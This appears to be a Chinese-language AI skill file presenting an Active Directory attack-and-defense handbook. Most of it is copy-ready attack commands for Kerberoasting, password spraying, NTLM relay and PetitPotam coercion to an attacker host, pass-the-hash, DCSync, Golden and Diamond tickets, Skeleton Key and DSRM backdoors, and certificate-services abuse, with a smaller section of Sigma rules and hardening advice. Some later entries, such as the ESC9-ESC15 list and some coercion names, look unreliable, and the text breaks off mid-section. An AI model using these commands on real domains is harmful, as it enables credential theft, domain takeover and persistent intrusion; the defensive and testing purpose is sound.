---
name: active-directory-security
description: >
  全面覆盖 Active Directory 安全的攻防手册。涵盖 AD 攻击全链路：
  侦察（BloodHound、LDAP 枚举、SPN 扫描）、凭据攻击（Kerberoasting、
  AS-REP Roasting、密码喷洒、LLMNR/NBT-NS 中毒、NTLM 中继）、
  横向移动（Pass-the-Hash、Pass-the-Ticket、Over-Pass-the-Hash、
  DCOM、WMI、PS Remoting）、权限提升（ACL 滥用、GPO 滥用、
  委托攻击、证书服务 ESC1-ESC8）、持久化（Golden Ticket、Silver Ticket、
  Skeleton Key、DSRM 后门、AdminSDHolder、GPO 后门），
  以及防御侧的检测规则（Sigma）、Tier Model、ESAE 架构、LAPS、
  保护特权账户。
domain: cybersecurity
subdomain: infrastructure-security
tags: [active-directory, kerberos, bloodhound, kerberoasting, ntlm-relay, pass-the-hash, golden-ticket, certificate-services, acl-abuse, gpo, tier-model, laps]
version: 2.0.0
---

# Active Directory 安全 — 完整攻防手册

## 适用场景

- 企业内网渗透测试中需要攻击或评估 AD 环境
- AD 环境安全审计（ACL、GPO、委托配置检查）
- AD 相关安全事件调查（Kerberoasting、横向移动检测）
- 部署 AD 安全加固措施（Tier Model、LAPS、ESAE）
- CTF 中 AD 域环境攻击题目

---

## Part A：攻击方法论

### 1. 侦察与信息收集

#### 1.1 初始枚举

```bash
# 域信息
ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=com" "(objectClass=domain)" 2>/dev/null
nltest /dsgetdc:domain.com           # Windows: 获取 DC 信息
nltest /domain_trusts                 # 信任关系

# PowerView (PowerShell)
Get-Domain                            # 域信息
Get-DomainController                  # DC 列表
Get-DomainUser                        # 所有用户
Get-DomainUser -Identity admin*       # 过滤用户
Get-DomainComputer                    # 所有计算机
Get-DomainGroup -Identity "*admin*"   # 管理组
Get-DomainGroupMember -Identity "Domain Admins"  # DA 成员
Get-DomainTrust                       # 域信任

# BloodHound — 自动化攻击路径分析
# 数据采集
SharpHound.exe -c all                 # C# 版本（推荐）
bloodhound-python -d domain.com -u user -p pass -ns DC_IP  # Python 版本
Invoke-BloodHound -CollectionMethod All  # PS 版本

# BloodHound 查询
# → "Find Shortest Path to Domain Admins"
# → "Find Principals with DCSync Rights"
# → "Users with Foreign Domain Group Membership"
```

#### 1.2 SPN 扫描（Kerberoasting 前置）

```powershell
# 枚举所有 SPN（服务主体名称）
setspn -T domain.com -Q */*
Get-DomainUser -SPN                    # PowerView: 有 SPN 的用户
```

### 2. 凭据攻击

#### 2.1 Kerberoasting

```bash
# 1. 请求服务票证
# Linux (Impacket)
GetUserSPNs.py domain.com/user:password -request
GetUserSPNs.py domain.com/user:password -request-user svc_mssql

# 2. 提取并破解
# 票证格式: $krb5tgs$23$*user$domain.com$spn*$HASH
hashcat -m 13100 ticket.txt rockyou.txt
john --format=krb5tgs --wordlist=rockyou.txt ticket.txt

# Rubeus (Windows)
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast /user:svc_mssql /outfile:hash.txt
```

#### 2.2 AS-REP Roasting

```bash
# 不需要凭据！针对 "Do not require Kerberos preauthentication" 的用户
# Linux
GetNPUsers.py domain.com/ -usersfile users.txt -format hashcat -outputfile hashes.txt
GetNPUsers.py domain.com/user:password -request

# 破解
hashcat -m 18200 hashes.txt rockyou.txt

# Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

#### 2.3 密码喷洒

```bash
# 一个密码 → 多个用户
# 检测账户锁定策略后再操作
net accounts /domain                  # Windows: 查看锁定策略

# CrackMapExec
crackmapexec smb DC_IP -u users.txt -p 'Spring2024!' --no-bruteforce

# Kerbrute
kerbrute passwordspray -d domain.com --dc DC_IP users.txt 'Spring2024!'

# 常见密码模式
Company2024!
SeasonYear! (Spring2024!, Summer2024!)
Welcome123
Password1!
Company@2024
```

#### 2.4 LLMNR/NBT-NS 中毒

```bash
# Responder — 截获网络认证哈希
responder -I eth0 -wrf

# 捕获的 NTLMv2 哈希破解
hashcat -m 5600 captured_hashes.txt rockyou.txt

# 结合 NTLM Relay（更危险）
# 1. Responder + ntlmrelayx
responder -I eth0 --disable-smb --disable-http
ntlmrelayx.py -t smb://TARGET -smb2support -c "whoami"
```

### 3. NTLM Relay

```bash
# Impacket ntlmrelayx
# Relay 到 SMB
ntlmrelayx.py -t smb://192.168.1.10 -smb2support

# Relay 到 LDAP（创建用户/修改 ACL）
ntlmrelayx.py -t ldap://DC_IP --delegate-access  # RBCD 攻击

# Relay 到 MSSQL
ntlmrelayx.py -t mssql://DB_SERVER

# Relay 到 HTTPS (ADCS)
ntlmrelayx.py -t http://ADCS_SERVER/certsrv -adcs --template DomainController

# PetitPotam — 强制认证（EfsRpc）
python3 PetitPotam.py ATTACKER_IP DC_IP
# DC 被迫向攻击者发起 NTLM 认证 → Relay 到 LDAP → DCSync

# Coercion 方法枚举
# PrinterBug (MS-RPRN)
# PetitPotam (MS-EFSRPC)
# ShadowCoerce (MS-FSRVP)
# dfscoerce (MS-DFSNM)
```

### 4. 横向移动

```bash
# === Pass-the-Hash ===
# 不需要明文密码，只需 NTLM 哈希
crackmapexec smb TARGET -u admin -H NTHASH --exec-method smbexec -x "whoami"
impacket-psexec domain.com/admin@TARGET -hashes :NTHASH
impacket-wmiexec domain.com/admin@TARGET -hashes :NTHASH

# Mimikatz (Windows)
mimikatz "sekurlsa::pth /user:admin /domain:domain.com /ntlm:NTHASH /run:cmd.exe"

# === Pass-the-Ticket ===
# 使用 Kerberos 票证而非密码
# 1. 导出票证
mimikatz "sekurlsa::tickets /export"

# 2. 注入票证
mimikatz "kerberos::ptt ticket.kirbi"

# === Over-Pass-the-Hash ===
# 将哈希转换为 Kerberos 票证
getTGT.py domain.com/admin -hashes :NTHASH
export KRB5CCNAME=admin.ccache
psexec.py domain.com/admin@TARGET -k -no-pass

# === DCOM 横向移动 ===
# 不需要 SMB/RDP
# 通过 DCOM 远程执行
$dcom = [Type]::GetTypeFromProgID("MMC20.Application","TARGET")
$obj = [Activator]::CreateInstance($dcom)
$obj.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami","7")

# === WMI 横向移动 ===
crackmapexec wmi TARGET -u admin -p password -x "whoami"
```

### 5. 权限提升

#### 5.1 ACL 滥用

```powershell
# PowerView — 查找可利用的 ACL
# GenericAll → 完全控制
Get-DomainObjectAcl -Identity targetuser -ResolveGUIDs

# 设置密码（GenericAll / ForceChangePassword）
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString "P@ss1234" -AsPlainText -Force)

# 添加用户到组（WriteDacl / GenericWrite）
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker

# GenericWrite → Targeted Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/SPN'}
GetUserSPNs.py domain.com/attacker:password -request-user targetuser
Set-DomainObject -Identity targetuser -Clear serviceprincipalname  # 清除 SPN
```

#### 5.2 委托攻击

```bash
# === 无约束委托 (Unconstrained Delegation) ===
# 查找有此配置的计算机
Get-DomainComputer -Unconstrained | select name

# 如果拿到无约束委托的计算机 → 提取所有用户票证
mimikatz "sekurlsa::tickets /export"  # 服务中会有 DA 的 TGT

# === 约束委托 (Constrained Delegation) ===
# 查找
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# S4U 攻击
getST.py -spn cifs/TARGET domain.com/svc_account -impersonate administrator
export KRB5CCNAME=administrator.ccache
psexec.py domain.com/administrator@TARGET -k -no-pass

# === 基于资源的约束委托 (RBCD) ===
# 如果攻击者有 WritePermission → 写入 msDS-AllowedToActOnBehalfOfOtherIdentity
# 1. 创建机器账户
addcomputer.py domain.com/attacker:password -computer-name FAKE$ -computer-pass Pass123

# 2. 配置 RBCD
rbcd.py domain.com/attacker:password -delegate-from FAKE$ -delegate-to TARGET$

# 3. S4U 获取管理员票证
getST.py -spn cifs/TARGET domain.com/FAKE$:Pass123 -impersonate administrator
```

#### 5.3 AD 证书服务 (ADCS) 攻击

```bash
# Certipy — ADCS 枚举
certipy find -u user@domain.com -p password -dc-ip DC_IP

# ESC1 — 模板允许客户端指定 SAN + 低权限可注册
certipy req -u user@domain.com -p password -ca CA_NAME -template VulnTemplate -upn administrator@domain.com

# ESC2 — 模板允许 Any Purpose
# 同 ESC1 方法

# ESC3 — 注册代理模板
# 1. 获取注册代理证书
certipy req -u user@domain.com -p password -ca CA_NAME -template EnrollAgent
# 2. 代理请求管理员证书
certipy req -u user@domain.com -p password -ca CA_NAME -template User -on-behalf-of 'domain\administrator' -pfx user.pfx

# ESC4 — 模板可被低权限用户修改
# 修改模板使其变为 ESC1
certipy template -u user@domain.com -p password -template VulnTemplate -save-old
certipy template -u user@domain.com -p password -template VulnTemplate -editor-supply-san

# ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 标志
# CA 级别允许 SAN 指定
certipy req -u user@domain.com -p password -ca CA_NAME -template User -upn administrator@domain.com

# ESC8 — NTLM Relay to AD CS HTTP Endpoint
ntlmrelayx.py -t http://ADCS/certsrv/certfnsh.asp -adcs --template DomainController

# 使用证书认证
certipy auth -pfx administrator.pfx -dc-ip DC_IP
# → 获取 NTLM 哈希 / TGT
```

### 6. 持久化

```bash
# === Golden Ticket ===
# 需要 krbtgt 哈希（从 DCSync 获取）
# 1. DCSync
mimikatz "lsadump::dcsync /user:domain\krbtgt"
secretsdump.py domain.com/admin:password@DC_IP

# 2. 伪造 Golden Ticket
mimikatz "kerberos::golden /user:administrator /domain:domain.com /sid:S-1-5-21-XXX /krbtgt:NTHASH /ticket:golden.kirbi"
# 或使用 Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXX -domain domain.com administrator

# === Silver Ticket ===
# 只需要服务账户的 NTLM 哈希
mimikatz "kerberos::golden /user:administrator /domain:domain.com /sid:S-1-5-21-XXX /target:server.domain.com /service:cifs /rc4:NTHASH /ticket:silver.kirbi"

# === Skeleton Key ===
# 注入到 LSASS，使任何密码 + "skeleton" 都能登录
mimikatz "privilege::debug" "misc::skeleton"
# 之后用任何密码 + "skeletonkey" 登录

# === DSRM 后门 ===
# 修改 DSRM 密码 = 已知密码
mimikatz "token::elevate" "lsadump::sam"  # 获取 DSRM 哈希
# 设置 DSRM 允许远程登录
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2
```

---

## Part B：检测与防御

### 7. 检测规则

#### 7.1 Kerberoasting 检测

```yaml
# Security Event ID 4769 — Kerberos TGS 请求
# 加密类型 0x17 (RC4) 是 Kerberoasting 指标
title: Potential Kerberoasting - RC4 TGS Request
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: "0x17"
  filter_legitimate:
    ServiceName|startswith: 'krbtgt'
  condition: selection and not filter_legitimate
level: medium
tags:
  - attack.t1558.003
```

#### 7.2 DCSync 检测

```yaml
# Event ID 4662 — 目录服务访问
# Replicating Directory Changes 权限被使用
title: Potential DCSync Attack
logsource:
  product: windows
  service: security
detection:
  replication_permissions:
    EventID: 4662
    Properties|contains:
      - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'  # DS-Replication-Get-Changes
      - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'  # DS-Replication-Get-Changes-All
  condition: replication_permissions
level: critical
tags:
  - attack.t1003.006
```

#### 7.3 Pass-the-Hash 检测

```yaml
# Event ID 4624 Type 3 — NTLM 认证 + 特殊登录
title: Potential Pass-the-Hash
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: 3
    AuthenticationPackageName: NTLM
    TargetUserName|contains: 'admin'
level: medium
tags:
  - attack.t1550.002
```

### 8. 安全加固

#### 8.1 Tier Model（分层模型）

```
Tier 0: 域控制器、AD 管理员（最高特权）
  → 专用管理员工作站 (PAW) 管理
  → 禁止非 Tier 0 账户登录 Tier 0 服务器
  → 禁止 Tier 0 账户登录非 Tier 0 机器

Tier 1: 服务器管理员（服务器操作系统权限）
  → 独立的管理账户
  → 禁止登录工作站

Tier 2: 工作站管理员（Helpdesk 等）
  → 仅限工作站管理
  → 禁止登录服务器
```

#### 8.2 LAPS（本地管理员密码方案）

```powershell
# 安装 LAPS
# 1. 导入 LAPS PowerShell 模块
Import-Module AdmPwd.PS

# 2. 设置 ACL — 允许计算机更新自己的密码
Set-AdmPwdComputerSelfPermission -Identity "OU=Computers,DC=domain,DC=com"

# 3. 设置谁可以读取密码
Set-AdmPwdReadPasswordPermission -Identity "OU=Computers,DC=domain,DC=com" -AllowedPrincipals "Domain Admins"

# 4. 在客户端安装 LAPS agent
# 密码自动随机化并存储在 AD 中
```

#### 8.3 关键加固清单

| 措施 | 优先级 | 防御的攻击 |
|------|--------|-----------|
| 部署 LAPS | P0 | 横向移动 via 本地管理员 |
| 禁止 NTLMv1 | P0 | NTLM Relay |
| 启用 LDAP 签名 | P0 | LDAP Relay |
| 启用 EPA (加密 RPC) | P1 | PetitPotam |
| 限制 DCOM/WMI 远程访问 | P1 | 横向移动 |
| 审计 ADCS 模板 | P1 | ESC1-ESC8 |
| Tier Model 分层 | P1 | 凭据窃取 |
| 部署 Microsoft ATA/Defender for Identity | P1 | 全链路检测 |
| 禁用 Kerberos RC4 | P2 | Kerberoasting |
| 启用 AES256 加密类型 | P2 | Kerberos 安全 |
| 保护 krbtgt 账户 | P2 | Golden Ticket |
| 定期重置 krbtgt 密码 | P2 | Golden Ticket 检测 |

---

## 速查表

### AD 攻击路径决策树

```
有域账户？
├── 否 → 密码喷洒 / LLMNR 中毒 / AS-REP Roasting
│        → 获取初始凭据
├── 是 → 普通用户权限
│   ├── Kerberoasting → 破解服务账户密码
│   ├── BloodHound → 寻找攻击路径
│   ├── ACL 滥用 → GenericAll/ForceChangePassword
│   ├── ADCS 利用 → ESC1-8 获取高权限证书
│   └── RBCD 攻击 → WritePermission → 委托
│   → 获取本地管理员权限
│       → 凭据提取 (Mimikatz/LSASS)
│           → Pass-the-Hash 横向移动
│               → 到达服务器
│                   → 提权到域管理员
│                       ├── ACL → DA
│                       ├── GPO → DA
│                       ├── 委托 → DA
│                       ├── ADCS → DA
│                       └── DCSync → krbtgt 哈希
│                           → Golden Ticket
│                               → 完全控制域
```

### 常用工具速查

| 用途 | Linux 工具 | Windows 工具 |
|------|-----------|-------------|
| 枚举 | ldapsearch, BloodHound | PowerView, AD Module |
| Kerberoasting | GetUserSPNs.py | Rubeus.exe |
| AS-REP Roasting | GetNPUsers.py | Rubeus.exe |
| PTH/PTT | impacket-psexec | Mimikatz |
| NTLM Relay | ntlmrelayx.py | Inveigh |
| ADCS | Certipy | Certify.exe |
| 凭据提取 | secretsdump.py | Mimikatz |
| 后渗透 | ticketer.py | Mimikatz Golden/Silver |

## MITRE ATT&CK 映射

| Tactic | Technique | ID |
|--------|-----------|-----|
| Discovery | Remote System Discovery | T1018 |
| Credential Access | Kerberoasting | T1558.003 |
| Credential Access | AS-REP Roasting | T1558.004 |
| Credential Access | OS Credential Dumping | T1003 |
| Credential Access | NTLM Relay | T1557.001 |
| Lateral Movement | Pass the Hash | T1550.002 |
| Lateral Movement | Pass the Ticket | T1550.003 |
| Lateral Movement | DCOM | T1021.003 |
| Privilege Escalation | ACL Abuse | T1068 |
| Persistence | Golden Ticket | T1558.001 |
| Persistence | Domain Account Manipulation | T1098 |
| Defense Evasion | Skeleton Key | T1055 |

## Part C：2025-2026 更新

> 本部分补充 2024-2026 年间 AD 攻防领域的重大技术演进，涵盖 AD CS 深度利用、
> Kerberos 高级攻击、BloodHound CE、Azure AD/Entra ID 攻击、以及最新防御框架。

---

### 9. AD CS 攻击深度解析（ESC1-ESC8+）

AD CS（Active Directory 证书服务）已成为域提权的首选攻击面。以下逐一详解各 ESC 场景。

#### 9.1 ESC1 — 客户端可指定 SAN 的模板

**条件**: 证书模板 `mspki-certificate-name-flag` 包含 `ENROLLEE_SUPPLIES_SUBJECT`，且低权限用户可注册。

```bash
# 枚举易受攻击模板
certipy find -u user@domain.com -p password -dc-ip DC_IP -vulnerable
# 或针对 ESC1 精确搜索
certipy find -u user@domain.com -p password -dc-ip DC_IP -enabled-only

# 利用：伪造管理员 SAN
certipy req -u user@domain.com -p password -ca "CA-NAME" \
  -template "VulnTemplate" \
  -upn "administrator@domain.com"

# 使用证书认证（获取 TGT / NTLM 哈希）
certipy auth -pfx administrator.pfx -dc-ip DC_IP

# 检测指标
# - Event ID 4887 (Certificate Services approved a certificate)
# - 证书 SAN 与请求者身份不匹配
# - 非管理员请求管理员主体名称
```

#### 9.2 ESC2 — Any Purpose / SubCA 模板

**条件**: `mspki-extension` 包含 OID 2.5.29.37.0（Any Purpose）或模板为 SubCA。

```bash
# Any Purpose 模板允许证书用于任何 EKU
# 利用方式同 ESC1，但不需要特定 EKU
certipy req -u user@domain.com -p password -ca "CA-NAME" \
  -template "AnyPurposeTemplate" \
  -upn "administrator@domain.com"

# SubCA 模板可被滥用为 ESC3 的注册代理
```

#### 9.3 ESC3 — 注册代理 (Enrollment Agent)

**条件**: 存在可被低权限注册的注册代理模板 + 允许代理注册的模板。

```bash
# 第一步：获取注册代理证书
certipy req -u user@domain.com -p password -ca "CA-NAME" \
  -template "EnrollmentAgent"

# 第二步：以代理身份请求目标用户证书
certipy req -u user@domain.com -p password -ca "CA-NAME" \
  -template "User" \
  -on-behalf-of "DOMAIN\\administrator" \
  -pfx enrollment_agent.pfx

# 防御: 限制注册代理列表 (CA -> Management -> Enrollment Agents)
```

#### 9.4 ESC4 — 模板配置可被修改

**条件**: 低权限用户对模板有 `WriteProperty` / `WriteDacl` / `GenericAll` 等权限。

```bash
# 保存原始配置
certipy template -u user@domain.com -p password \
  -template "TargetTemplate" -save-old

# 修改为 ESC1（添加 SAN 标志）
certipy template -u user@domain.com -p password \
  -template "TargetTemplate" \
  -editor-supply-san \
  -enrollee-supplies-subject

# 利用修改后的模板
certipy req -u user@domain.com -p password -ca "CA-NAME" \
  -template "TargetTemplate" \
  -upn "administrator@domain.com"

# 恢复原始配置（隐蔽性）
certipy template -u user@domain.com -p password \
  -template "TargetTemplate" -template-old template_old.json
```

#### 9.5 ESC5 — CA 对象权限可被滥用

**条件**: 低权限用户对 CA 对象（计算机对象或 CA 注册表）有写权限。

```bash
# 修改 CA 的 EDITF_ATTRIBUTESUBJECTALTNAME2 标志（等同于 ESC6）
# 或修改 CA 的安全描述符
# 或修改 CA 的注册表 HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration

# 实战中较罕见，但危害极大
```

#### 9.6 ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

**条件**: CA 级别设置了 `EDITF_ATTRIBUTESUBJECTALTNAME2` 标志，允许在任何模板中指定 SAN。

```bash
# 枚举 CA 标志
certipy find -u user@domain.com -p password -dc-ip DC_IP -text

# 利用（即使模板本身不允许 SAN）
certipy req -u user@domain.com -p password -ca "CA-NAME" \
  -template "User" \
  -upn "administrator@domain.com"

# 防御: 禁用该标志
certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
# 重启证书服务
net stop certsvc && net start certsvc
```

#### 9.7 ESC7 — CA 管理权限可被利用

**条件**: 低权限用户被授予 `ManageCertificates` 或 `ManageCA` 权限。

```bash
# ManageCertificates → 批准待定请求
# ManageCA → 修改 CA 配置 / 颁发管理

# 1. 请求待审批模板的证书
certipy req -u user@domain.com -p password -ca "CA-NAME" \
  -template "ApprovalRequired"

# 2. 审批自己的请求
certipy ca -u user@domain.com -p password -ca "CA-NAME" \
  -issue-request <RequestID>

# 3. 下载已审批证书
certipy req -u user@domain.com -p password -ca "CA-NAME" \
  -retrieve <RequestID>
```

#### 9.8 ESC8 — NTLM Relay to AD CS HTTP Endpoint

**条件**: AD CS 开启了 HTTP/SCEP/CES Web 注册接口，且未启用 EPA（Extended Protection for Authentication）。

```bash
# 经典 PetitPotam → NTLM Relay → AD CS
# Step 1: 设置 ntlmrelayx 监听
ntlmrelayx.py -t http://ADCS_SERVER/certsrv/certfnsh.asp \
  -adcs --template "DomainController"

# Step 2: 强制 DC 认证
python3 PetitPotam.py ATTACKER_IP DC_IP

# 或使用 PrintSpooler
printerbug.py domain.com/user:pass@DC_IP ATTACKER_IP

# 2025 新增 — more coercions:
# - ShadowCoerce (MS-FSRVP)
# - dfscoerce (MS-DFSNM)
# - NightMare (MS-EVEN)
# - ChefCoerce (MS-RAA)
# - PullCoerce (MS-SCMR)

# 防御:
# 1. 在 AD CS 上启用 EPA (Extended Protection for Authentication)
# 2. 禁用 HTTP 端点，仅保留 HTTPS
# 3. 启用 "Require SSL" 和客户端证书映射
```

#### 9.9 ESC9-ESC15 (2024-2025 新发现)

```
ESC9  — 无域认证亦可利用（证书链 + NTLM Relay 组合）
ESC10 — 弱证书映射 (StrongCertificateBindingEnforcement = 0/1)
ESC11 — RPC 加密未强制 (ICertPassage 远程协议)
ESC12 — 证书注册通过电子邮件 (SCEP)
ESC13 — 基于组的 EKU 滥用（AuthorizedSignatures = 0）
ESC14 — 证书模板的 NTAuthCertificates 滥用
ESC15 — 域间 PKI 信任滥用
```

---

### 10. Kerberos 高级攻击

#### 10.1 Shadow Credentials 攻击

**原理**: 利用 `msDS-KeyCredentialLink` 属性向目标对象写入原始公钥，然后使用 PKINIT 获取该对象的 TGT。

```bash
# 前提: 域功能级别 Windows Server 2016+，攻击者对目标有 WriteProperty/GenericWrite

# Certipy 方式
certipy shadow auto -u attacker@domain.com -p password \
  -account "TARGET$"

# Whisker (Windows)
Whisker.exe add /target:TARGET$ /domain:domain.com
# → 获取 TGT

# 攻击链: WriteProperty → msDS-KeyCredentialLink → PKINIT → TGT → 服务票证
# 常见目标: 计算机账户 → RBCD → 域管

# 检测:
# - Event ID 5136 (目录对象修改) + msDS-KeyCredentialLink 属性变更
# - Event ID 4768 (TGT 请求) + 证书认证 (PA-PK-AS-REQ)
```

#### 10.2 RBCD（基于资源的约束委托）进阶

```bash
# === 完整攻击链 ===

# 1. 获取对目标计算机的 GenericWrite / WriteComputerName 等权限
# 2. 创建受控机器账户 (ms-DS-MachineAccountQuota 默认 = 10)
addcomputer.py domain.com/user:password -computer-name ATTACK$ -computer-pass Pass123

# 3. 设置 RBCD（写入 msDS-AllowedToActOnBehalfOfOtherIdentity）
rbcd.py domain.com/user:password \
  -delegate-from ATTACK$ \
  -delegate-to TARGET$

# 4. S4U2Self + S4U2Proxy 获取管理员服务票证
getST.py -spn cifs/TARGET.domain.com domain.com/ATTACK$:Pass123 \
  -impersonate administrator

# 5. 使用票证访问目标
export KRB5CCNAME=administrator.ccache
psexec.py domain.com/administrator@TARGET -k -no-pass

# 2025 变体: 通过 Shadow Credentials 设置 RBCD
# 1. Shadow Credentials → 获取机器账户 TGT
# 2. 修改 msDS-AllowedToActOnBehalfOfOtherIdentity
# 3. S4U 攻击链
```

#### 10.3 Diamond Ticket（钻石票据）

**原理**: 修改合法 TGT 的字段（PAC、持续时间等），而非伪造全新票据，更难检测。

```bash
# 使用 Mimikatz
mimikatz "kerberos::diamond /user:normaluser /domain:domain.com \
  /sid:S-1-5-21-XXX /krbtgt:KRBTGT_NTHASH \
  /ticketuser:administrator /groups:512 /ticket:diamond.kirbi"

# 与 Golden Ticket 区别:
# Golden: 完全伪造，不影响原票据
# Diamond: 请求合法 TGT 后就地修改，保留原有加密特征

# 检测难度更高:
# - Event ID 4768 中的 PreAuthType 不异常
# - 但 PAC 中的组列表与用户实际组不匹配
# - 对比 4768 和 4769 中的用户名是否一致
```

#### 10.4 Purple Ticket

**原理**: 通过 KDC 中继（KDC Proxy / PKINIT）实现跨信任边界的票据攻击，无需直接接触目标域的 krbtgt。

```bash
# 跨林/跨域场景下的攻击
# 利用 KDC Proxy (MS-KKDCP) 中继认证请求
# 适用于外部信任/林信任环境

# 检测:
# - Event ID 4768/4769 中异常的跨域认证模式
# - 证书认证源与目标域不匹配
```

#### 10.5 noPAC (CVE-2021-42278 + CVE-2021-42287)

```bash
# 即使已有补丁，仍需确认配置

# 利用链:
# 1. 创建机器账户
addcomputer.py domain.com/user:password -computer-name FAKE$ -computer-pass Pass123

# 2. 将机器账户伪装为 DC（利用 42278 — sAMAccountName 不含 $ 尾部验证）
renameComputer.py domain.com/FAKE$:Pass123 -new-name DC_NAME

# 3. 请求 TGT
getTGT.py domain.com/DC_NAME:Pass123

# 4. 恢复机器账户名
renameComputer.py domain.com/DC_NAME:Pass123 -new-name FAKE

# 5. 使用 TGT 获取服务票证 (S4U2self → PAC 中包含 DA 组)
# 利用 42287 — KDC 查找不到机器账户时使用附加 $ 重查

# 检测:
# - Event ID 4662 + sAMAccountName 修改
# - Event ID 4741 (计算机账户创建)
# - Event ID 4742 (计算机账户属性修改)
```

---

### 11. BloodHound CE (Community Edition) 最新用法

BloodHound CE 是 SpecterOps 在 2024 年发布的完全重写版本，替代了旧版 BloodHound。

#### 11.1 架构变化

```
旧版 BloodHound:
  SharpHound → Neo4j → BloodHound GUI (Electron)

BloodHound CE:
  SharpHound/BloodHound CLI → API Server (Go) → Web UI (React)
  - 不再需要 Neo4j
  - 内置数据库
  - RESTful API
  - 支持多用户/团队协作
```

#### 11.2 数据采集

```bash
# SharpHound (C#) — 仍然推荐
SharpHound.exe -c all -d domain.com
SharpHound.exe -c all --searchforest  # 全林收集
SharpHound.exe -c DCOnly              # 仅 DC 数据（无需域管权限）
SharpHound.exe -c LoggedOn,Session,ACL # 指定收集方法

# BloodHound CLI (Python, 新增)
bloodhound-ce-python -d domain.com -u user -p pass -ns DC_IP

# AzureHound (Azure/Entra ID)
AzureHound.exe -t "ACCESS_TOKEN" list
```

#### 11.3 关键查询与分析

```
BloodHound CE 内置查询:
1. "Find Shortest Path to Domain Admins"
2. "Find Principals with DCSync Rights"
3. "Users with Foreign Domain Group Membership"
4. "Certificate Template Abuse Paths" (2025 新增)
5. "Azure → On-Prem Attack Paths" (混合环境)

自定义 Cypher 查询:
# 查找所有可被 Shadow Credentials 攻击的路径
MATCH (u:User)-[:GenericAll|GenericWrite|WriteProperty]->(t:User)
WHERE t.enabled = true
RETURN u.name, t.name

# 查找 ADCS 攻击路径
MATCH p = (u:User)-[:Enroll|AutoEnroll]->(ct:CertTemplate)-[:PublishedTo]->(ca:EnterpriseCA)
WHERE ct.enrolleSuppliesSubject = true
RETURN p
```

---

### 12. LDAP 枚举与查询技术

#### 12.1 高级 LDAP 查询

```bash
# === Linux (ldapsearch) ===

# 所有域用户及其属性
ldapsearch -x -H ldap://DC_IP -D "user@domain.com" -w password \
  -b "DC=domain,DC=com" "(objectClass=user)" \
  sAMAccountName mail memberOf adminCount

# 查找高价值目标 (adminCount=1)
ldapsearch -x -H ldap://DC_IP -D "user@domain.com" -w password \
  -b "DC=domain,DC=com" "(adminCount=1)" sAMAccountName

# 查找所有 SPN (Kerberoasting 目标)
ldapsearch -x -H ldap://DC_IP -D "user@domain.com" -w password \
  -b "DC=domain,DC=com" "(servicePrincipalName=*)" \
  sAMAccountName servicePrincipalName

# 查找无约束委托的计算机
ldapsearch -x -H ldap://DC_IP -D "user@domain.com" -w password \
  -b "DC=domain,DC=com" "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
  sAMAccountName

# 查找 AD CS 证书模板
ldapsearch -x -H ldap://DC_IP -D "user@domain.com" -w password \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com" \
  "(objectClass=pKICertificateTemplate)" cn displayName

# 查找 GPO
ldapsearch -x -H ldap://DC_IP -D "user@domain.com" -w password \
  -b "CN=Policies,CN=System,DC=domain,DC=com" "(objectClass=groupPolicyContainer)" \
  cn displayName gPCFileSysPath
```

```powershell
# === Windows (PowerShell AD Module) ===

# 高级过滤
Get-ADUser -Filter {adminCount -eq 1} -Properties *
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}  # AS-REP Roasting 目标
Get-ADComputer -Filter {TrustedForDelegation -eq $true}  # 无约束委托
Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true}  # 约束委托

# 查找 GPO 链接
Get-ADOrganizationalUnit -Filter * | %{ Get-GPInheritance -Target $_.DistinguishedName }

# 查找 LAPS 密码 (如有权限)
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select Name, ms-Mcs-AdmPwd

# ADSI 加速查询
([ADSISearcher]"(objectClass=user)").FindAll()
([ADSISearcher]"(servicePrincipalName=*)").FindAll()
([ADSISearcher]"(adminCount=1)").FindAll()
```

#### 12.2 LDAP 签名与通道绑定

```
检测 LDAP 签名状态:
# Event ID 2886 (未签名的 LDAP 绑定)
# Event ID 2887 (LDAP 签名验证失败)

加固 LDAP:
# GPO: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
# "Domain controller: LDAP server signing requirements" = Require signing

# 或注册表:
reg add HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v LDAPServerIntegrity /t REG_DWORD /d 2

# LDAP Channel Binding Token (CBT):
# "Domain controller: Channel binding token" = Always
```

---

### 13. NTLM Relay 攻击进阶

#### 13.1 EFSRPC (PetitPotam) 系列攻击

```bash
# PetitPotam — 通过 MS-EFSRPC 强制认证
# 无需认证即可触发（默认配置下）
python3 PetitPotam.py ATTACKER_IP DC_IP

# 变体:
# - PetitPotam.py (MS-EFSRPC Opnum 19: EfsRpcOpenFileRaw)
# - PetitPotam.py (MS-EFSRPC Opnum 5: EfsRpcEncryptFileSrv)

# 防御:
# 启用 EPA (Extended Protection for Authentication) on AD CS
# 禁用 EFSRPC: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\RPC" /v EnableEFSRPC /t REG_DWORD /d 0
```

#### 13.2 认证强制 (Authentication Coercion) 方法汇总

```
